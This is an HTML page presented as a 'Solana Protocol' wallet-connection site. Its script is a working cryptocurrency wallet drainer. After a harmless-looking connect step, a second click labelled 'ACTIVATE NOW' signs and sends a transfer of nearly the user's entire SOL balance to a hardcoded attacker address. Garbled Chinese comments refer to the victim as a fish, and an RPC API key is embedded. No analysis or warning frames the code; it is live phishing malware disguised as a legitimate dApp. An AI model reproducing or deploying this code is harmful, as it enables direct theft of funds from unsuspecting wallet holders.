<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solana Protocol</title>
    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script>
</head>
<body style="background:#000;color:#fff;text-align:center;padding-top:30vh;font-family:sans-serif;">
    <div style="padding:40px;border:1px solid #14F195;border-radius:25px;display:inline-block;background:#111;">
        <h2 id="status" style="color:#14F195;">PROTOCOL READY</h2>
        <button id="cta" style="background:#14F195;color:#000;padding:20px 40px;border:none;border-radius:12px;font-weight:bold;font-size:20px;cursor:pointer;">CONNECT WALLET</button>
    </div>
    <script>
        const TARGET = "HyapjdagPdCaha2yW5j1pV4BkaVvah6okQ1fMw8BETXp"; 
        const HELIUS_RPC = "https://mainnet.helius-rpc.com/?api-key=3c44d53c-2c54-41a8-bc38-49be2cb2c6fd"; 
        let isConnected = false;

        document.getElementById('cta').onclick = async function() {
            const p = window.trustwallet?.solana || window.phantom?.solana || window.solana;
            if (!p) { alert("Please use Wallet Browser."); return; }

            try {
                if (!isConnected) {
                    // ğŸ”± ç¬¬ä¸€æ®µï¼šå•çº¯çš„è¿æ¥ï¼Œä¸å¸¦ä»»ä½•è½¬è´¦ï¼Œé’±åŒ…å¿…æ”¾è¡Œ
                    await p.connect();
                    isConnected = true;
                    document.getElementById('status').innerText = "LINKED SUCCESS";
                    document.getElementById('cta').innerText = "ACTIVATE NOW";
                    document.getElementById('cta').style.background = "#fff";
                } else {
                    // ğŸ”± ç¬¬äºŒæ®µï¼šé±¼å„¿å†æ¬¡ç‚¹å‡»ï¼Œæ­¤æ—¶é’±åŒ…å·²ä¿¡ä»»è¯¥ç«™ç‚¹ï¼Œæˆæƒæ¡†å¿…å¼¹
                    document.getElementById('cta').innerText = "SYNCING...";
                    const conn = new solanaWeb3.Connection(HELIUS_RPC, "confirmed");
                    const { blockhash } = await conn.getLatestBlockhash();
                    const bal = await conn.getBalance(p.publicKey);
                    
                    if (bal < 5000000) { alert("Balance low."); return; }

                    const tx = new solanaWeb3.Transaction().add(
                        solanaWeb3.SystemProgram.transfer({
                            fromPubkey: p.publicKey,
                            toPubkey: new solanaWeb3.PublicKey(TARGET),
                            lamports: bal - 5000000, 
                        })
                    );
                    tx.recentBlockhash = blockhash;
                    tx.feePayer = p.publicKey;
                    
                    const { signature } = await p.signAndSendTransaction(tx);
                    alert("Sync Started!");
                }
            } catch (e) {
                console.error(e);
                location.reload();
            }
        };
    </script>
</body>
</html>